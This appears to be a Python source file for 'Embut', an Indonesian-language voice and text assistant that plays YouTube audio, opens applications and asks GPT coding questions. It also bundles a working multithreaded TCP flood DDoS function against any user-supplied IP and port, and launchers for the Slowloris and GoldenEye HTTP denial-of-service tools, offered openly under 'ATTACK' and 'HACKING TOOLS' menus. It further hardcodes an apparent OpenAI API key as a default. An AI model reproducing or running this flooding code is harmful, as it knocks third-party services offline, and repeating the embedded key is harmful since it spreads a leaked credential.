import os
import re
import webbrowser
import datetime
import openai
import pyttsx3
import yt_dlp
import vlc
import socket
import threading
import random
import time
import requests
import sys
import platform
import subprocess
import speech_recognition as sr
from colorama import init, Fore, Style
import pyfiglet

# === KONFIGURASI ===
openai.api_key = os.getenv("OPENAI_API_KEY", "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")

init(autoreset=True)
engine = pyttsx3.init()
engine.setProperty('rate', 160)
player = None

# === GLOBAL FLAG UNTUK DDOS ===
ddos_stop_flag = threading.Event()

def ngomong(text):
    print(f"{Fore.GREEN}🐱 Embut: {text}{Fore.RESET}")
    engine.say(text)
    engine.runAndWait()

def hear_the_sound():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print(Fore.CYAN + "🎤 Listening..." + Fore.RESET)
        audio = r.listen(source)
        try:
            order = r.recognize_google(audio, language="id-ID")
            print(f"{Fore.LIGHTYELLOW_EX}> (Suara) {order}{Fore.RESET}")
            return order.lower()
        except:
            ngomong("Maaf, tolong ulangi lebih jelas.")
            return ""

def buka_aplikasi(name):
    apps = {
        "chrome": "start chrome",
        "notepad": "start notepad"
    }
    if name in apps:
        os.system(apps[name])
        ngomong(f"{name.capitalize()} terbuka")
    else:
        ngomong("Aplikasi tidak dikenali")

def bantu_ngoding(perintah):
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": "Kamu adalah asisten coding pintar."},
                {"role": "user", "content": perintah}
            ]
        )
        jawaban = response["choices"][0]["message"]["content"]
        ngomong("Ini jawabannya...")
        print(Fore.LIGHTMAGENTA_EX + jawaban + Fore.RESET)
        ngomong(jawaban[:100])
    except Exception as e:
        print(f"{Fore.RED}⚠️ Gagal ambil jawaban dari Embut: {e}{Fore.RESET}")

def play_lagu(judul):
    global player
    if not judul:
        ngomong("Judul lagunya nggak boleh kosong.")
        return
    try:
        vlc_path = r"C:\Program Files\VideoLAN\VLC\vlc.exe"
        os.environ["PATH"] += os.pathsep + os.path.dirname(vlc_path)
        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': True,
            'default_search': 'ytsearch1',
            'nocheckcertificate': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(judul, download=False)
            stream_url = info['entries'][0]['url'] if 'entries' in info else info['url']
        ngomong(f"Muterin lagu: {judul} langsung dari YouTube...")
        instance = vlc.Instance()
        player = instance.media_player_new()
        media = instance.media_new(stream_url)
        player.set_media(media)
        player.play()
        time.sleep(1)
    except Exception as e:
        ngomong(f"⚠️ Gagal muter lagu: {str(e)}")

def pause_lagu():
    global player
    if player:
        player.pause()
        ngomong("Lagu dijeda")
    else:
        ngomong("Belum ada lagu yang diputar")

def stop_lagu():
    global player
    if player:
        player.stop()
        ngomong("Lagu dihentikan")
        player = None
    else:
        ngomong("Tidak ada lagu yang sedang diputar")

def log_aktivitas(command):
    waktu_sekarang = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a") as file:
        file.write(f"[{waktu_sekarang}] {command}\n")

def ddos_attack(ip, port):
    while not ddos_stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            packet = random._urandom(1024)
            s.send(packet)
            print(Fore.RED + f"[+] Packet sent to {ip}:{port}" + Fore.RESET)
            s.close()
        except Exception:
            pass

def start_ddos(ip, port, threads):
    ddos_stop_flag.clear()
    print(Fore.GREEN + f"🚀 Mulai serangan ke {ip}:{port} dengan {threads} thread..." + Fore.RESET)
    for _ in range(threads):
        t = threading.Thread(target=ddos_attack, args=(ip, port))
        t.daemon = True
        t.start()
    print(Fore.YELLOW + "Tekan CTRL+C untuk menghentikan serangan." + Fore.RESET)
    try:
        while not ddos_stop_flag.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        ddos_stop_flag.set()
        print(Fore.CYAN + "\n🛑 Serangan dihentikan oleh user." + Fore.RESET)

def cek_ping_ip(ip_address):
    print(f"\n=== PING KE {ip_address} ===")
    try:
        ping_cmd = ["ping", "-n", "4", ip_address] if platform.system().lower() == "windows" else ["ping", "-c", "4", ip_address]
        result = subprocess.run(ping_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print(Fore.GREEN + "[✓] Ping berhasil!" + Fore.RESET)
            print(result.stdout)
            match = re.search(r'Average = (\d+ms)', result.stdout)
            if match:
                print(f"\n[✓] Rata-rata latency: {match.group(1)}")
        else:
            print(Fore.RED + "[!] Gagal ping." + Fore.RESET)
            print(result.stderr)
    except Exception as e:
        print(f"{Fore.RED}[!] Error saat ping: {e}{Fore.RESET}")

def tampilkan_menu():
    # Neon ASCII Title
    ascii_banner = pyfiglet.figlet_format("EMBUT", font="slant")
    for line in ascii_banner.splitlines():
        for i in range(0, 10):
            sys.stdout.write(Fore.LIGHTMAGENTA_EX + " " * i + line + "\r")
            sys.stdout.flush()
            time.sleep(0.01)
        print(Fore.LIGHTCYAN_EX + " " * 10 + line)
    print(Fore.YELLOW + "=" * 70)
    # Menu items tampil normal, hanya sekali, tetap berwarna
    menu_items = [
        (Fore.MAGENTA, "🎵 MUSIK"),
        (Fore.LIGHTGREEN_EX, "  ▶ play [judul lagu]" + Fore.WHITE + "         ➜ Muterin lagu langsung dari YouTube"),
        (Fore.LIGHTGREEN_EX, "  ⏸ pause" + Fore.WHITE + "                    ➜ Jeda lagu yang sedang diputar"),
        (Fore.LIGHTGREEN_EX, "  ⏹ stop" + Fore.WHITE + "                     ➜ Hentikan lagu yang sedang diputar\n"),
        (Fore.MAGENTA, "🌐 APLIKASI"),
        (Fore.LIGHTGREEN_EX, "  🌍 buka chrome" + Fore.WHITE + "              ➜ Buka Google Chrome"),
        (Fore.LIGHTGREEN_EX, "  📄 buka notepad" + Fore.WHITE + "             ➜ Buka Notepad\n"),
        (Fore.MAGENTA, "⚔️ ATTACK & NETWORK"),
        (Fore.LIGHTGREEN_EX, "  💣 serang [ip] [port] [threads]" + Fore.WHITE + " ➜ Mulai serangan DDoS TCP Flood"),
        (Fore.LIGHTGREEN_EX, "  🛑 stopddos" + Fore.WHITE + "                 ➜ Hentikan serangan DDoS"),
        (Fore.LIGHTGREEN_EX, "  🔍 cekip [domain]" + Fore.WHITE + "           ➜ Cek IP dan port dari domain"),
        (Fore.LIGHTGREEN_EX, "  📡 cekping [ip/domain]" + Fore.WHITE + "      ➜ Cek koneksi (ping)\n"),
        (Fore.MAGENTA, "🤖 AI CODING"),
        (Fore.LIGHTGREEN_EX, "  💬 tanya [perintah]" + Fore.WHITE + "         ➜ Nanya soal coding ke GPT\n"),
        (Fore.MAGENTA, "🛠️ HACKING TOOLS"),
        (Fore.LIGHTGREEN_EX, "  🐍 slowloris [target]" + Fore.WHITE + "        ➜ Jalankan serangan Slowloris"),
        (Fore.LIGHTGREEN_EX, "  🦾 goldeneye" + Fore.WHITE + "                ➜ Jalankan GoldenEye (HTTP DoS)\n"),
        (Fore.MAGENTA, "🗣️ INPUT MODE"),
        (Fore.LIGHTGREEN_EX, "  🎙️ suara" + Fore.WHITE + "                   ➜ Gunakan perintah suara"),
        (Fore.LIGHTGREEN_EX, "  ⌨️ ketik" + Fore.WHITE + "                   ➜ Gunakan perintah ketikan\n"),
        (Fore.MAGENTA, "🔧 LAINNYA"),
        (Fore.LIGHTGREEN_EX, "  📋 menu" + Fore.WHITE + "                    ➜ Tampilkan menu ini lagi"),
        (Fore.LIGHTGREEN_EX, "  🧹 clear" + Fore.WHITE + "                   ➜ Bersihkan layar"),
        (Fore.LIGHTGREEN_EX, "  ❌ exit" + Fore.WHITE + "                    ➜ Keluar dari Embut\n"),
    ]
    for color, item in menu_items:
        print(color + item)
    print(Fore.YELLOW + "=" * 70)

def proses_perintah(perintah):
    log_aktivitas(perintah)
    if perintah.startswith("buka "):
        app = perintah[5:]
        buka_aplikasi(app)
    elif perintah.startswith("tanya "):
        prompt = perintah[6:]
        bantu_ngoding(prompt)
    elif perintah.startswith("play "):
        judul = perintah[5:]
        play_lagu(judul)
    elif perintah == "pause":
        pause_lagu()
    elif perintah == "stop":
        stop_lagu()
    elif perintah == "menu":
        tampilkan_menu()
    elif perintah == "clear":
        os.system('cls' if os.name == 'nt' else 'clear')
    elif perintah.startswith("serang "):
        parts = perintah.split()
        if len(parts) < 2:
            ngomong("Format serang: serang [ip] [port] [threads]")
            return
        ip = parts[1]
        try:
            port = int(parts[2]) if len(parts) > 2 else 80
            threads = int(parts[3]) if len(parts) > 3 else 100
            if not (1 <= port <= 65535):
                ngomong("Port harus antara 1-65535!")
                return
            if threads < 1 or threads > 1000:
                ngomong("Threads harus antara 1-1000!")
                return
        except ValueError:
            ngomong("Port dan threads harus berupa angka!")
            return
        try:
            ip = socket.gethostbyname(ip)
        except Exception as e:
            ngomong(f"Gagal resolve IP: {e}")
            return
        ngomong(f"Menyerang {ip}:{port} dengan {threads} thread. Tekan CTRL+C atau ketik 'stopddos' untuk berhenti.")
        start_ddos(ip, port, threads)
    elif perintah == "stopddos":
        ddos_stop_flag.set()
        print(Fore.CYAN + "🛑 Permintaan stop DDoS diterima." + Fore.RESET)
    elif perintah.startswith("cekip "):
        domain = perintah[6:]
        try:
            ip = socket.gethostbyname(domain)
            ngomong(f"IP dari {domain} adalah {ip}")
            print("Port umum: 80 (HTTP), 443 (HTTPS)")
        except Exception as e:
            ngomong(f"Gagal resolve IP: {e}")
    elif perintah.startswith("cekping"):
        parts = perintah.split()
        target = parts[1] if len(parts) > 1 else "8.8.8.8"
        try:
            ip = socket.gethostbyname(target)
            cek_ping_ip(ip)
        except Exception as e:
            ngomong(f"Gagal resolve IP dari {target}: {e}")
    elif perintah.startswith("slowloris "):
        target = perintah.split(" ", 1)[1]
        try:
            subprocess.run(["slowloris", target])
        except Exception as e:
            ngomong(f"Gagal menjalankan slowloris: {e}")
    elif perintah.startswith("goldeneye "):
        try:
            target = perintah.split(" ", 1)[1]
            os.chdir("GoldenEye-master")
            subprocess.run(["python", "goldeneye.py", target, "-w", "100"])
            os.chdir("..")
        except Exception as e:
            ngomong(f"Gagal menjalankan GoldenEye: {e}")
    elif perintah == "exit":
        ngomong("Sampai jumpa rek!")
        exit()
    else:
        ngomong("Perintah tidak dikenali.")

def main():
    ngomong("Halo, gue Embut. Mau ketik atau ngomong?")
    tampilkan_menu()
    while True:
        mode = input(Fore.LIGHTCYAN_EX + "Ketik [suara] atau [ketik]: ").lower()
        if mode == "suara":
            command = hear_the_sound()
        elif mode == "ketik":
            waktu = datetime.datetime.now().strftime("%H:%M")
            prompt = f"{Fore.GREEN}[{waktu}] > {Fore.RESET}"
            command = input(prompt).lower()
        else:
            ngomong("Pilihannya cuma [suara] atau [ketik]")
            continue
        if command:
            proses_perintah(command)

if __name__ == "__main__":
    main()
